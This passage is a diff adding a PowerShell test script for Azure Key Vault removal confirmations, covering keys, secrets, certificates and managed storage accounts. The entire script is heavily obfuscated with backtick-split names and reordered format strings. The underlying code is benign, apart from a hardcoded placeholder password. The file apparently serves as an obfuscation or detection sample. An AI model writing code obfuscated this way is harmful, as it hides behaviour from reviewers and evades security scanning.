@@ -1,0 +1,420 @@
+${p`Fx`pwD}='123'
+${sECuRe`P`F`XpWd}=${PF`xPwd} | &("{5}{0}{1}{4}{2}{3}" -f 'onve','r','o-','SecureString','tT','C') -AsPlainText -Force
+${dA`Ta}=123
+${Secur`eDa`TA}=${D`ATa} | &("{5}{2}{0}{4}{1}{3}" -f 'nvert','tri','o','ng','To-SecureS','C') -AsPlainText -Force	
+${pfXPASs`WO`Rd} = "123"
+  
+function cREA`TeA`KvcerTif`Ica`TE(
+    [string] ${keyV`Au`Lt},
+    [string] ${CE`R`T`IFIcATEName})
+{
+    ${p`FXpA`TH} = &("{7}{3}{4}{5}{6}{0}{2}{1}" -f'mmon','a','Dat','t-F','il','ePathFrom','Co','Ge') ("{2}{0}{3}{1}" -f'port','1.pfx','im','pfx0')
+    ${s`EcUrEPFx`pASs`Word} = &("{2}{4}{1}{0}{3}" -f 'n','-SecureStri','Conv','g','ertTo') ${PfxpaSS`w`O`Rd} -AsPlainText -Force
+    ${C`ReaTE`D`Cert} = &("{5}{6}{1}{2}{3}{4}{0}{8}{7}" -f 'ltCertifi','ort-A','zK','eyVa','u','Im','p','e','cat') ${k`EyVAu`Lt} ${CE`RTIfI`cATeN`A`ME} -FilePath ${PFXP`ATH} -Password ${SeC`UREpfxPA`S`SWO`RD}
+    ${gLoB`A`L:cR`eA`TEdCeRTi`F`iCA`T`eS} += ${CERtIf`ica`T`E`Name}
+
+    return ${cr`eaTeDCE`Rt}
+}
+
+function cReate`AkVm`A`Nag`eDSTO`R`A`geAc`cOu`NT(
+    [string] ${Key`V`AULT},
+    [string] ${mAnAgeDSTO`R`AGe`ACC`O`UNt`NaME})
+{
+    ${St`oRa`GeA`CCO`UNTREsOUrc`e`Id} = &("{5}{7}{2}{3}{8}{9}{10}{1}{6}{4}{0}"-f'd','Res','Mana','ged','ceI','Get-KeyV','our','ault','Sto','r','age')
+    ${cREATedMANaG`e`D`s`TOR`AgE`ACco`Unt} = &("{6}{2}{4}{8}{7}{0}{3}{1}{5}"-f 'ag','oun','-AzKeyVa','eAcc','ultMana','t','Add','Stor','ged') ${kE`yVA`U`lt} ${maN`Ag`EDsToRaG`e`ACcOunTNaMe} ${s`TorAgeaccOU`N`TRE`SOu`R`ceid} ("{0}{1}" -f 'ke','y1') -DisableAutoRegenerateKey
+    return ${C`ReaTeD`MAn`Age`dstO`Ra`gE`A`CcoUNt}
+}
+
+function CRe`ATeAKV`m`A`NaGedSTORAG`esASd`E`FinitiON(
+    [string] ${kEyVA`U`Lt},
+    [string] ${Ma`Na`gEdStORAgeA`cC`ounT`NA`mE},
+    [string] ${MaN`AgeDsTOra`G`esASDefIni`TIo`NNAme})
+{
+    ${Storag`E`A`Cco`UN`T`R`esouRceiD} = &("{3}{6}{5}{4}{0}{2}{1}" -f 'e','Id','Resource','Ge','dStorag','KeyVaultManage','t-')
+    &("{0}{2}{1}{3}{5}{7}{6}{4}" -f 'Ad','ey','d-AzK','Va','nt','ultManage','ageAccou','dStor') ${KEy`V`A`ULt} ${MA`NAg`edsTo`RA`GEaC`CoUNTNa`ME} ${S`TOR`AgEACcO`U`NTReso`Urc`E`Id} ("{1}{0}" -f '1','key') -DisableAutoRegenerateKey
+    ${crEa`TE`dMaN`A`ge`dSTo`RagesasdefiN`I`TION} = &("{10}{2}{8}{6}{5}{0}{4}{9}{3}{7}{1}"-f 't','ion','-','fin','orageSa','agedS','zKeyVaultMan','it','A','sDe','Set') ${k`eYva`UlT} ${M`ANAgE`dStOr`AGe`ACCOUNTnA`mE} ${M`AnA`Ged`S`To`RagES`ASDEFInitIo`NNaMe} -Parameter @{("{1}{0}{2}"-f 'T','sas','ype')=("{1}{0}" -f 'ice','serv');("{3}{2}{4}{0}{1}"-f'SasTyp','e','ic','serv','e')=("{0}{1}" -f'bl','ob');("{4}{0}{1}{3}{5}{2}" -f 'o','ur','es','ce','signedRes','Typ')="b";("{1}{0}{2}"-f 'd','signe','Version')=("{1}{0}{2}" -f'016-0','2','5-31');("{2}{3}{1}{0}{4}" -f'col','Proto','s','igned','s')=("{0}{1}"-f 'htt','ps');("{0}{1}"-f'signedI','p')=("{4}{2}{3}{0}{1}{5}"-f'.','1.','.60','-168','168.1.5','5.70');("{1}{3}{0}{2}" -f 'tyPer','vali','iod','di')=("{1}{0}"-f'D','P30');("{4}{0}{1}{2}{3}" -f'n','edPermissi','o','ns','sig')="ra";("{2}{1}{0}" -f 'me','Na','blob')=("{1}{0}"-f'lob1','b');("{3}{0}{1}{2}" -f 'onta','inerNa','me','c')=("{1}{3}{0}{2}" -f'i','c','ner1','onta');("{0}{1}"-f'rs','cd')="";("{0}{1}"-f 'rsc','c')=""}
+    return ${cRE`A`TeDMAnAg`eDs`TORAGEsa`sdeFINiTION}
+}
+
+
+function teST_rem`OvE`keyW`It`hTWOco`N`Fi`RmatioNs
+{
+    &("{3}{1}{2}{0}"-f 'st','e','-Ho','Writ') -ForegroundColor ("{1}{0}" -f 'w','Yello') ((("{4}{3}{2}{0}{1}" -f'Yes35J twic','e','35J','ype ','T'))  -CRePlaCe  '35J',[char]39)
+    ${KeYV`AUlT} = &("{2}{1}{3}{0}" -f 'lt','t','Ge','-KeyVau')
+    ${ke`y`NaME}=&("{3}{2}{1}{0}" -f'ame','KeyN','t-','Ge') ("{2}{1}{0}"-f've','mo','re')
+    ${k`EY}=&("{1}{0}{3}{2}"-f 'AzK','Add-','yVaultKey','e') -VaultName ${ke`y`VauLT} -Name ${k`ey`NAME} -Destination ("{2}{0}{1}"-f'tw','are','Sof')
+    &("{3}{1}{0}{2}"-f'ul','rt-NotN','l','Asse') ${K`Ey}
+    ${gl`OB`A`l:creAT`E`dkEYs} += ${k`EYna`me}
+    
+    ${cR}=${G`Lobal:coNFiR`MpReF`Er`e`Nce}
+    ${glOb`Al`:cONf`i`Rmpr`EfeRENCE}=("{1}{0}" -f'igh','H')    
+    &("{1}{0}{4}{3}{2}"-f'move-AzKe','Re','ey','VaultK','y') -VaultName ${keYV`Au`LT} -Name ${K`EY`Name}
+    ${gloBaL:cOnfi`Rm`PrE`FeREn`Ce}=${C`R}
+    
+    ${K`Ey} = &("{2}{1}{4}{0}{3}{5}"-f't','-AzKeyV','Get','Ke','aul','y')  -VaultName ${k`EY`VAu`LT} -Name ${k`eyn`AME}
+    &("{2}{0}{1}" -f 'ert-','Null','Ass') ${k`Ey}
+}
+
+
+function t`eS`T_r`EmOvEk`ey`wI`THoneCo`N`FIRMaTIo`Ns
+{
+    &("{1}{0}{2}"-f 'H','Write-','ost') -ForegroundColor ("{1}{0}{2}" -f 'llo','Ye','w') ((("{1}{3}{2}{0}"-f 'nce','Ty','{0} o','pe {0}Yes'))  -f [CHaR]39)
+    ${keY`VA`UlT} = &("{1}{2}{0}" -f't','Ge','t-KeyVaul')
+    ${k`Ey`NAmE}=&("{2}{0}{3}{1}"-f '-K','Name','Get','ey') ("{0}{1}{2}" -f 'r','em','ove')
+    ${K`EY}=&("{0}{1}{3}{2}" -f'Add-','AzKeyVault','ey','K') -VaultName ${KEy`VA`UlT} -Name ${Ke`YnAme} -Destination ("{0}{2}{1}"-f'Soft','re','wa')
+    &("{0}{2}{1}" -f'A','tNull','ssert-No') ${K`Ey}
+    ${Gl`oBa`L:c`R`Eat`EdKEyS} += ${kEyN`A`me}
+    
+    ${CR}=${GLob`AL:C`ONf`IrMPR`EFEre`NCe}   
+    ${gl`oBAL:CoNfIRMpr`eFeR`eN`ce}=("{0}{1}" -f 'Hi','gh')     
+    &("{1}{2}{3}{4}{0}"-f'ey','Remove-A','z','KeyVau','ltK') -VaultName ${KEy`VaU`LT} -Name ${k`Ey`NaME} -Force
+    ${Gl`O`BaL:`ConFirMPREf`E`ReNce}=${cr}
+
+    ${K`ey} = &("{0}{4}{5}{3}{1}{2}"-f'Get','yVau','ltKey','e','-','AzK')  -VaultName ${KEy`V`AUlt} -Name ${kEy`N`AME}
+    &("{0}{1}{2}" -f 'Assert','-','Null') ${k`EY}
+}
+
+
+function Tes`T_`cancEl`KeY`Rem`oVA`l`oncE
+{
+    &("{1}{2}{0}" -f'-Host','Writ','e') -ForegroundColor ("{1}{0}"-f'ellow','Y') ((("{3}{2}{1}{4}{0}"-f'ce','ONoijO','j','Type i',' on'))."rePLa`cE"(([Char]105+[Char]106+[Char]79),[STRIng][Char]39))
+    ${KeYV`A`U`lT} = &("{0}{2}{1}" -f 'G','t-KeyVault','e')
+    ${Key`Na`ME}=&("{1}{0}{2}" -f'ey','Get-K','Name') ("{0}{1}"-f'rem','ove')
+    ${K`ey}=&("{1}{4}{0}{2}{3}" -f 'au','Add-A','l','tKey','zKeyV') -VaultName ${KE`yVAu`LT} -Name ${kEY`NA`ME} -Destination ("{1}{0}" -f'ware','Soft')
+    &("{2}{3}{0}{1}"-f 't','Null','Asser','t-No') ${k`ey}
+    ${glObAL`:`c`ReAt`eD`keYs} += ${K`EYna`mE}
+    
+    ${cr}=${G`Lobal:coNFi`R`MPrEf`e`REncE}    
+    ${GLobaL:C`oN`F`i`RmPrEf`e`R`EncE}=("{0}{1}"-f'H','igh')    
+    &("{1}{4}{0}{5}{2}{3}" -f 'Az','Rem','Vau','ltKey','ove-','Key') -VaultName ${key`VAulT} -Name ${k`E`YNaME}       
+    ${glO`B`Al:CoNFi`R`mpReF`EREnCe}=${cR}
+
+    ${k`ey}=&("{1}{4}{3}{5}{0}{2}" -f'ult','G','Key','AzKey','et-','Va')  -VaultName ${k`EYvauLT} -Name ${K`EynaME}
+    &("{2}{4}{0}{1}{3}"-f 'ert-No','t','A','Null','ss') ${k`EY}
+}
+
+
+function T`e`sT_COnfIRmThE`NCAnCeLk`eyrem`O`VaL
+{
+    &("{2}{1}{0}" -f 'Host','e-','Writ') -ForegroundColor ("{1}{0}"-f'ellow','Y') ((("{8}{0}{3}{4}{6}{7}{5}{2}{1}" -f 'ype E4aYesE4a first','a',' E4aNoE4','. ','T','ype','he','n t','T')) -crEPLaCe  'E4a',[chAr]39)
+    ${kEY`VaU`Lt} = &("{1}{0}{2}"-f 'y','Get-Ke','Vault')
+    ${k`EYN`AME}=&("{2}{0}{1}{3}" -f '-Key','Nam','Get','e') ("{0}{1}" -f're','move')
+    ${K`ey}=&("{2}{3}{1}{0}" -f 'zKeyVaultKey','d-A','A','d') -VaultName ${keYv`A`UlT} -Name ${keY`N`Ame} -Destination ("{1}{0}{2}"-f 'war','Soft','e')
+    &("{1}{0}{3}{2}" -f 'tN','Assert-No','l','ul') ${k`EY}
+    ${GlOBa`L:C`ReAt`EDkeys} += ${K`eYnAME}
+    
+    ${cr}=${gLob`Al:cO`NF`iRM`pr`eFerencE}   
+    ${GLO`BAl:C`On`FirmprEfE`Re`NCe}=("{1}{0}"-f'gh','Hi')     
+    &("{5}{0}{1}{2}{4}{3}" -f 'e-','A','zKe','Key','yVault','Remov') -VaultName ${ke`y`VaULt} -Name ${keY`N`AME}
+    ${GlObAL:`cOnfIrMp`R`eFeRE`NcE}=${CR}
+
+    ${k`ey}=&("{0}{3}{1}{2}" -f 'Get-A','au','ltKey','zKeyV')  -VaultName ${k`eYv`AuLt} -Name ${ke`y`NamE}
+    &("{1}{2}{4}{0}{3}" -f'l','As','s','l','ert-NotNu') ${K`eY}
+}
+
+
+
+
+function T`es`T_Re`mO`VEs`Ec`ReTWIthTwO`CONf`iR`MatIo`NS
+{
+    &("{0}{1}{2}"-f'Write','-','Host') -ForegroundColor ("{1}{0}" -f'llow','Ye') ((("{1}{3}{0}{2}{5}{4}"-f 'e 1R','Ty','XYes1RX','p','wice',' t'))."R`EpL`ACe"(([chAr]49+[chAr]82+[chAr]88),[strINg][chAr]39))
+    ${kE`yvA`UlT} = &("{2}{3}{1}{0}"-f 'lt','-KeyVau','G','et')
+    ${SEC`R`eTNAME}= &("{3}{2}{0}{1}"-f'ecr','etName','S','Get-') ("{1}{0}"-f'e','remov')  
+    ${S`ec}=&("{2}{1}{3}{4}{0}"-f'ecret','t-A','Se','zKey','VaultS') -VaultName ${K`EY`VauLT} -Name ${SE`cr`ETNA`me}  -SecretValue ${sE`cUR`EdaTA}
+    &("{1}{3}{0}{2}" -f 'otNul','As','l','sert-N') ${s`ec}
+    ${Globa`l:cr`eAtED`s`ECRETs} += ${s`eCr`eTNAmE}   
+       
+    ${CR}=${gLOBA`l`:`CONFIrM`prEf`e`ReNCE}    
+    ${Gl`o`BaL:`cONfirmPrE`FerencE}=("{0}{1}" -f 'Hi','gh')    
+    &("{0}{2}{1}{4}{3}"-f 'Re','tS','move-AzKeyVaul','ret','ec') -VaultName ${KEy`Va`Ult} -Name ${sE`cre`TnAme} 
+    ${G`loBAl:c`oNFI`RMPRE`FeRe`NCe}=${cr}
+	
+    ${S`Ecr`et} = &("{2}{0}{1}{3}"-f 'e','yVau','Get-AzK','ltSecret') -VaultName ${kEYv`A`UlT} -Name ${sEcRE`T`Na`mE}
+    &("{3}{0}{1}{2}" -f '-','Nu','ll','Assert') ${Sec`R`eT}
+}
+
+
+function te`st_REM`ovEs`ECreT`WITh`one`CONfiRMAti`o`NS
+{
+    &("{2}{1}{3}{0}" -f 't','ite-','Wr','Hos') -ForegroundColor ("{0}{1}" -f'Yello','w') ((("{2}{3}{4}{0}{1}"-f'eszav ','once','T','ype',' zavY'))."reP`LAcE"(([cHaR]122+[cHaR]97+[cHaR]118),[STrINg][cHaR]39))
+    ${KEyv`AUlT} = &("{0}{1}{3}{2}"-f 'G','et-K','Vault','ey')
+    ${secreTn`A`mE}= &("{1}{3}{2}{0}" -f'e','Get-S','retNam','ec') ("{0}{1}" -f'r','emove')  
+    ${S`ec}=&("{3}{1}{4}{0}{2}{5}" -f'ul','KeyV','tSe','Set-Az','a','cret') -VaultName ${K`eyv`A`ULT} -Name ${s`EcREt`N`AME}  -SecretValue ${sECu`Red`ATA}
+    &("{0}{1}{2}"-f 'Asse','rt-Not','Null') ${s`eC}
+    ${GlOBAL:CR`eAT`E`DsEcRe`TS} += ${S`EcrEt`NaMe}   
+       
+    ${C`R}=${G`l`oBal:confir`m`p`ReF`ErENcE}   
+    ${G`LO`BAL:CO`NfiRmPrE`FeR`en`CE}=("{1}{0}"-f'gh','Hi')    
+    &("{0}{1}{2}{4}{3}" -f'Rem','ove-AzKe','yVau','t','ltSecre') -VaultName ${kE`yV`AULt} -Name ${sE`cReTNA`Me}  -Force
+    ${g`L`O`BaL:c`onfIR`mPREF`Er`EnCE}=${C`R}
+
+    ${secr`et} = &("{4}{0}{1}{5}{2}{3}"-f'-','AzK','yVaultS','ecret','Get','e') -VaultName ${ke`Yv`AULt} -Name ${se`c`Re`TNAmE}
+    &("{2}{1}{0}"-f 'ert-Null','s','As') ${sE`C`ReT}
+}
+
+
+function TeST_`cANc`el`sEcR`ETreMOvaL`oNce
+{
+    &("{0}{1}{2}" -f 'W','rite-H','ost') -ForegroundColor ("{2}{1}{0}" -f 'low','el','Y') ((("{2}{1}{0}{3}"-f'{0}No{0}','ype ','T',' once')) -F  [Char]39)
+    ${k`EYV`Au`lt} = &("{2}{1}{0}" -f 't','et-KeyVaul','G')
+    ${Secr`e`T`NaME}= &("{1}{2}{0}" -f 'Name','Ge','t-Secret') ("{0}{1}" -f 'remo','ve')  
+    ${s`eC}=&("{0}{3}{2}{1}"-f 'Se','Secret','AzKeyVault','t-') -VaultName ${kEy`V`AULt} -Name ${SEc`RetnA`me}  -SecretValue ${s`eCure`dAtA}
+    &("{1}{2}{0}{3}"-f 'N','Assert-N','ot','ull') ${s`EC}
+    ${gLobAl:Cre`A`TEDS`eCR`etS} += ${SEcR`Et`NAME}   
+       
+    ${C`R}=${gl`obAL:CoN`FI`RM`PrEFer`enCE}    
+    ${glOBa`L:C`ON`F`I`RM`pREFeReN`ce}=("{0}{1}"-f'H','igh')    
+    &("{0}{4}{3}{1}{2}" -f 'Re','r','et','ve-AzKeyVaultSec','mo') -VaultName ${KeY`Vau`Lt} -Name ${s`Ec`RET`NAMe}
+    ${GLoBal:cO`N`F`IrmpReFeRe`NCE}=${Cr}
+
+    ${s`EC}=&("{3}{0}{2}{4}{1}"-f 'yVault','et','Sec','Get-AzKe','r') -VaultName ${key`VA`UlT} -Name ${sE`CRe`T`Name} 
+    &("{2}{1}{0}"-f'otNull','N','Assert-') ${s`ec}
+}
+
+
+function TesT_cOnFirmt`HeNca`NcelSe`CRE`T`RE`MOvAL
+{
+    &("{1}{2}{3}{0}"-f't','Wr','ite-H','os') -ForegroundColor ("{2}{1}{0}"-f'w','o','Yell') ((("{1}{6}{8}{0}{3}{7}{2}{5}{4}{9}"-f 'f','Typ','h','i','n type ','e','e','rst. T',' {0}Yes{0} ','{0}No{0}'))  -f [chAR]39)
+    ${kEyVaU`Lt} = &("{0}{2}{3}{1}" -f'Ge','eyVault','t','-K')
+    ${sEC`RE`TNA`ME}= &("{2}{1}{3}{0}"-f'tName','-Secr','Get','e') ("{0}{1}"-f'remo','ve')  
+    ${S`Ec}=&("{3}{1}{0}{2}{4}"-f 'KeyVau','Az','ltS','Set-','ecret') -VaultName ${k`EyVa`ULT} -Name ${S`ecReTnA`mE}  -SecretValue ${SEc`U`R`EdAta}
+    &("{1}{0}{2}"-f'rt-Not','Asse','Null') ${s`eC}
+    ${glO`Bal:Cr`e`A`TeDSecr`ETS} += ${s`E`CreTnAME}   
+       
+    ${cr}=${glObAL:c`oNF`i`R`mPrEFer`EN`cE}    
+    ${GLOB`AL`:`coNfI`RMpREFer`enCe}=("{0}{1}" -f 'Hi','gh')
+    &("{1}{3}{4}{2}{0}{5}{6}" -f'l','R','yVau','emove-Az','Ke','t','Secret') -VaultName ${Key`VAuLT} -Name ${sEcr`e`TnaME}  
+    ${GLOB`AL`:cONf`IrmpREFEr`eNcE}=${CR}
+
+    ${s`EC}=&("{3}{4}{0}{1}{2}"-f 'zKey','VaultS','ecret','Ge','t-A') -VaultName ${K`e`yVAULt} -Name ${S`E`c`ReTNAMe} 
+    &("{0}{2}{1}" -f'A','sert-NotNull','s') ${s`eC}
+}
+
+
+function T`eST_`R`EmOVec`ErTIfic`AT`ew`ithtwOCo`Nfi`R`maTiONS
+{
+    &("{1}{0}{2}"-f 'te-H','Wri','ost') -ForegroundColor ("{0}{1}{2}" -f'Y','ello','w') ((("{3}{5}{4}{1}{2}{0}"-f '0} twice','}','Yes{','T','0','ype {'))  -f [cHaR]39)
+    ${k`eYv`Au`LT} = &("{1}{0}{2}" -f'ey','Get-K','Vault')
+    ${c`ertIFICAT`ena`ME} = &("{2}{3}{5}{4}{1}{0}"-f'teName','ca','Ge','t-','fi','Certi') ("{1}{0}{2}" -f'e','r','moveWithTwo')
+    ${ce`RT} = &("{0}{1}{2}{3}{5}{4}" -f 'Cr','eat','eAKVC','er','te','tifica') ${K`ey`VaulT} ${ce`R`T`IFi`cAtename}
+    &("{0}{2}{1}"-f 'Assert','l','-NotNul') ${c`ert}
+    ${G`lobA`l:C`R`e`AtedceR`Tif`icateS} += ${CE`RtIfiC`A`TeNAME}
+
+    ${cR}=${g`L`oBA`l:cOnfi`RmP`Re`FErE`NCe}
+    ${GlOb`AL:Confi`RMP`REF`eRENCe}=("{0}{1}" -f'Hi','gh')
+    &("{0}{5}{3}{1}{2}{4}" -f'R','ove-AzKeyVault','Certif','m','icate','e') -VaultName ${Ke`Y`VAuLt} -Name ${Ce`RTiF`ic`AtenA`mE}
+    ${gL`OBAl`:C`ONfirM`P`R`EFe`ReNCe}=${c`R}
+	
+    ${CE`Rt} = &("{3}{2}{0}{4}{1}"-f 'VaultCert','cate','-AzKey','Get','ifi') -VaultName ${KEy`V`AULt} -Name ${cErti`FiCat`E`Na`Me}
+    &("{2}{1}{0}{3}" -f 'rt-Nu','sse','A','ll') ${c`erT}
+}
+
+
+function t`ESt_remOveC`e`RtifiCATewiT`H`o`N`eC`oNfIRM`AtIonS
+{
+    &("{0}{2}{1}{3}"-f'Writ','o','e-H','st') -ForegroundColor ("{0}{1}"-f 'Yel','low') ((("{1}{0}{2}{3}"-f'0}Ye','Type {','s{0} ','once'))-F [CHaR]39)
+    ${Ke`yvAu`lT} = &("{2}{1}{0}"-f'ault','eyV','Get-K')
+    ${cert`I`FIcATe`NA`mE} = &("{0}{4}{3}{1}{2}"-f'G','ificate','Name','t-Cert','e') ("{0}{1}{3}{2}{4}"-f'r','em','eWithOn','ov','e')
+    ${c`Ert} = &("{0}{3}{2}{1}" -f 'Cre','ate','VCertific','ateAK') ${k`eYvAU`LT} ${cEr`T`IFicaTEn`Ame}
+    &("{1}{2}{0}" -f 'll','Assert-No','tNu') ${Ce`Rt}
+    ${glob`Al:`CREaTEdCeRT`i`F`iCAT`ES} += ${Cer`T`IFi`ca`TeNAMe}
+
+    ${Cr}=${GL`o`B`Al`:conF`iRmPrE`FeRenCE}
+    ${GL`obal`:CoN`F`iRMpreFE`R`eNce}=("{1}{0}" -f'igh','H')
+    &("{5}{7}{8}{1}{6}{0}{4}{2}{3}" -f 'ultC','yV','tif','icate','er','R','a','e','move-AzKe') -VaultName ${K`eyVau`LT} -Name ${ce`RTIfIca`TEN`A`mE} -Force
+    ${G`lO`BaL`:`con`F`iRMpreFE`RENCE}=${c`R}
+
+    ${cE`RT} = &("{4}{0}{3}{1}{2}"-f 'e','VaultCertificat','e','t-AzKey','G') -VaultName ${k`eyv`AULT} -Name ${CER`TIfi`C`AT`eN`Ame}
+    &("{2}{1}{0}" -f 't-Null','ser','As') ${cE`Rt}
+}
+
+
+function TEst_Ca`NcelCerTif`I`CAteR`eMoV`Alo`NcE
+{
+    &("{1}{0}{2}" -f 'te-','Wri','Host') -ForegroundColor ("{0}{1}" -f'Yel','low') ((("{2}{1}{0}{3}" -f'}No{0}','0','Type {',' once'))-F[chAr]39)
+    ${k`eYV`AULt} = &("{1}{0}{3}{2}" -f 'y','Get-Ke','t','Vaul')
+    ${ceRTificA`T`EN`A`Me} = &("{1}{2}{0}{3}{4}" -f 'ficate','Get-Cert','i','Nam','e') ("{3}{0}{1}{4}{2}" -f'mo','v','ne','re','eAgainstO')
+    ${ce`Rt} = &("{0}{1}{3}{2}"-f'CreateAK','VC','ate','ertific') ${k`E`YvAULt} ${ceRTiF`i`caten`AMe}
+    &("{1}{4}{0}{3}{2}"-f'ert-Not','A','ull','N','ss') ${c`ERT}
+    ${Gl`oBAL:creaTe`D`cE`RtIFIcAT`es} += ${CErt`IF`IcAt`EN`AmE}
+
+    ${CR}=${GlOb`Al:`confirmp`ReFeRen`ce}
+    ${gLO`BAL:cON`Fi`Rmpr`EF`ere`NCE}=("{1}{0}" -f'h','Hig')
+    &("{6}{2}{5}{0}{3}{4}{1}"-f'e-AzK','cate','em','eyVaultC','ertifi','ov','R') -VaultName ${k`e`yVaUlt} -Name ${c`Er`TIfic`ATenamE}
+    ${Gl`Oba`L:Con`FIrMp`RefeRENce}=${cR}
+
+    ${s`ec}=&("{0}{4}{3}{1}{6}{5}{2}{7}" -f 'Get','V','a','zKey','-A','c','aultCertifi','te') -VaultName ${ke`YV`AULT} -Name ${ce`R`TIficat`eNa`mE}
+    &("{2}{1}{0}{3}"-f'ert','ss','A','-NotNull') ${S`Ec}
+}
+
+
+function t`est_cONfiRMtHe`N`CAncElC`Er`Ti`FI`CAteremOv`AL
+{
+    &("{0}{1}{2}"-f'Write-Ho','s','t') -ForegroundColor ("{0}{1}{2}" -f 'Yel','l','ow') ((("{0}{1}{2}{4}{6}{5}{3}"-f'Type 40u','Yes40','u ','o40u','first. ','N','Then type 40u'))."reP`lACE"('40u',[STRING][cHAr]39))
+    ${KEYV`A`UlT} = &("{2}{1}{3}{0}" -f 'Vault','-Ke','Get','y')
+    ${C`er`TIf`i`catEnAME} = &("{1}{0}{2}{3}"-f'-Certific','Get','at','eName') ("{2}{5}{4}{3}{0}{1}"-f'ns','tTwo','re','i','oveAga','m')
+    ${c`eRT} = &("{4}{0}{1}{3}{2}" -f'eateAKVCert','ific','e','at','Cr') ${keyV`A`UlT} ${c`eRTiFicA`TeNaMe}
+    &("{1}{2}{4}{3}{0}" -f 'otNull','As','ser','-N','t') ${ce`Rt}
+    ${g`LOB`Al`:c`Re`AtedcE`RTifIC`A`Tes} += ${C`ErTifIc`A`TE`Name}
+
+    ${c`R}=${glOBa`l:c`On`F`IRmprE`F`erE`NCE}
+    ${gLOBaL`:C`oN`Fi`R`MPre`FereNce}=("{0}{1}"-f 'Hi','gh')
+    &("{4}{1}{0}{5}{3}{6}{2}" -f 'AzK','e-','ificate','au','Remov','eyV','ltCert') -VaultName ${kEY`VAU`lT} -Name ${cER`TI`FIcaT`En`AmE}
+    ${Glob`AL:CO`NfIRM`P`RefeRence}=${cR}
+
+    ${s`ec}=&("{0}{2}{4}{3}{1}" -f 'Ge','ate','t-AzK','Certific','eyVault') -VaultName ${KE`Y`VA`ULT} -Name ${CE`Rt`ifICA`T`EnamE}
+    &("{3}{4}{1}{2}{0}" -f 'tNull','t','-No','A','sser') ${s`Ec}
+}
+
+
+function Te`St_`REmOV`eMA`NagEdsTO`RA`g`eaCCo`UnT`WIthtWOCOn`FIR`Ma`TIOns
+{
+    &("{1}{2}{0}" -f 't','Write-H','os') -ForegroundColor ("{0}{2}{1}"-f'Y','low','el') ((("{3}{0}{1}{4}{2}"-f 'VXY','es0V','twice','Type 0','X '))-RePLaCe  '0VX',[chAr]39)
+    ${K`Eyv`Ault} = &("{0}{2}{1}" -f 'Get','yVault','-Ke')
+    ${MAnageD`S`TOrAgEACC`Ount`NA`mE} = &("{6}{1}{0}{5}{3}{2}{4}" -f'orageA','edSt','tN','coun','ame','c','Get-Manag') ("{1}{0}"-f'emW2','r')
+    ${MA`NAgeD`sTor`A`g`eaCcOUnT} = &("{5}{6}{8}{1}{0}{4}{7}{2}{3}" -f'aged','n','u','nt','St','CreateA','KV','orageAcco','Ma') ${Ke`Y`VA`Ult} ${m`AnaGeDStoRaGE`A`c`cOUn`TNAMe}
+    &("{1}{4}{0}{2}{3}" -f '-','Asse','NotNu','ll','rt') ${maN`AGeDsTorAg`EA`Cc`ouNt}
+    ${Glob`A`L:cr`eat`E`DMAn`Ag`eDsTor`AGEAC`C`OUNTS} += ${M`ANag`edsto`RAge`AcCo`UnTnAme}
+
+    ${Cr}=${Glob`A`l:C`ONfi`R`MpRefE`R`eNce}
+    ${G`lobAL:c`oNF`IrM`preFErE`NCE}=("{1}{0}" -f 'igh','H')
+    &("{0}{3}{2}{7}{5}{8}{1}{6}{4}" -f 'Remove-','o','yVaultMan','AzKe','nt','t','u','agedS','orageAcc') -VaultName ${KE`YV`A`ULT} -AccountName ${mANaGEd`sToRageACC`o`Unt`NaMe}
+    ${G`loBA`L`:`CoNfIrMpREFerEnce}=${cr}
+
+    &("{1}{0}{2}" -f 'ssert-Throw','A','s') { &("{0}{4}{2}{10}{9}{6}{3}{8}{5}{1}{7}"-f 'Get','o','au','gedStora','-AzKeyV','eAcc','na','unt','g','a','ltM') -VaultName ${Ke`yVau`lt} -AccountName ${MANagEDStOr`A`geAcCo`Un`TNA`me} }
+}
+
+
+function tE`S`T_rEmoV`e`maNAGeDSTORag`EacC`oUNT`wItH`O`NEcONFi`Rm`AtiOns
+{
+    &("{2}{1}{0}" -f 't','os','Write-H') -ForegroundColor ("{2}{1}{0}" -f 'w','lo','Yel') ((("{1}{0}{2}{3}"-f ' ','Type','uATYe','suAT once'))-ReplAce  'uAT',[CHaR]39)
+    ${k`Eyva`ULt} = &("{2}{0}{3}{1}" -f '-KeyV','lt','Get','au')
+    ${Mana`gED`stoRAg`eA`ccOUNtNAme} = &("{0}{3}{1}{4}{5}{2}" -f 'Ge','nagedStor','ntName','t-Ma','a','geAccou') ("{1}{0}" -f'mW1','re')
+    ${MA`N`Ag`eDSTo`RAG`eAc`COUNT} = &("{8}{0}{3}{4}{5}{2}{7}{6}{1}"-f'eate','count','ag','AKVMa','nag','edStor','Ac','e','Cr') ${K`EyVAuLT} ${MANa`GE`dstO`RA`g`EaC`C`oUntNAME}
+    &("{4}{2}{3}{0}{1}" -f'l','l','-N','otNu','Assert') ${mAnaGe`D`sT`orA`GE`ACcou`Nt}
+    ${glO`B`Al:Cre`AteDman`A`GEds`ToraGe`Acc`OUntS} += ${Ma`NAg`edstorag`eaCCO`U`Nt`NAMe}
+
+    ${C`R}=${GLO`B`Al:c`oNfirMPrEf`er`EN`CE}
+    ${g`lOBaL`:cONf`IrMPRE`FeRE`NCE}=("{0}{1}" -f 'Hig','h')
+    &("{11}{7}{10}{8}{1}{4}{9}{3}{5}{2}{6}{0}" -f 'count','V','ag','nagedSt','aul','or','eAc','e-','Key','tMa','Az','Remov') -VaultName ${ke`y`VaulT} -AccountName ${m`ANaGeDSTO`Rag`ea`c`COuNtnAme} -Force
+    ${glOBAl:C`o`NFiRMpr`e`F`E`REnCe}=${cR}
+
+    &("{2}{1}{3}{0}" -f 's','Thr','Assert-','ow') { &("{0}{1}{6}{4}{2}{8}{3}{10}{9}{7}{5}"-f 'Get-A','zK','tManagedStora','eA','yVaul','t','e','n','g','u','cco') -VaultName ${kEyvAU`lt} -AccountName ${MA`Na`GeDs`TorAGEACcOuNT`NAmE} }
+}
+
+
+function TESt`_cA`NcELMAN`A`g`eDStO`RagEaC`CouNtrEm`OvAL`On`cE
+{
+    &("{2}{1}{0}{3}" -f 'e-','t','Wri','Host') -ForegroundColor ("{0}{1}" -f 'Yel','low') ((("{2}{3}{1}{0}"-f 'e','No{0} onc','Type ','{0}'))  -F  [Char]39)
+    ${keyVa`ULt} = &("{1}{0}{2}{3}"-f 't-K','Ge','e','yVault')
